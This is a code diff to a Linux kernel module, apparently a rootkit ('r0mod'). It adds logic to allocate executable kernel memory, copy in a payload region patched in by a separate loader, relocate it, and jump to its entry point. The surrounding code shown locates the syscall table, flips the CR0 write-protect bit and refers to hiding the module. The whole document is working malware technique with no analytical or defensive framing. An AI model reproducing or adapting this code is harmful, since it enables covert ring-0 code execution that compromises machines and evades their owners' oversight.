@@ -4,6 +4,7 @@
 
 #include <linux/unistd.h>   // syscalls
 #include <linux/syscalls.h> // syscalls
+#include <linux/vmalloc.h>
 
 #include <asm/paravirt.h>   // write_cr0
 
@@ -11,6 +12,14 @@
 
 #define SEARCH_START    PAGE_OFFSET
 #define SEARCH_END      ULONG_MAX //PAGE_OFFSET + 0xffffffff
+
+/* patched by r0bin.c:insmod() */
+unsigned long marker            = 0xdeadb33f;
+unsigned long kstart            = -1;
+unsigned long klen              = -1;
+unsigned long kenter            = -1;
+unsigned char *r0mem    = (void *)-1;
+int (*reloc)(unsigned char *, void (*pk)(char *, ...)) = (void *)-1;
 
 unsigned long *syscall_table;
 
@@ -50,6 +59,9 @@ unsigned long *find_sys_call_table(void)
 
 static int __init r0mod_init(void)
 {
+    int i;
+    int (*kinit)(void);
+
     printk("Module starting...\n");
 
     //printk("Hiding module object.\n");
@@ -74,7 +86,17 @@ static int __init r0mod_init(void)
 
     write_cr0(read_cr0() | 0x10000);
 
-    return 0;
+    r0mem = __vmalloc(8192 * 3, GFP_KERNEL, PAGE_KERNEL_EXEC);
+    printk("r0mem: 0x%p\n", r0mem);
+
+    reloc(r0mem, (void*)&printk);
+    for(i = 0; i < klen; i++)
+        *(r0mem + i) = *(unsigned char *)(kstart + i);
+
+    kinit = (void *)(kenter - kstart);
+    kinit = (void *)r0mem + (unsigned long)kinit;
+
+    return kinit();
 }
 
 
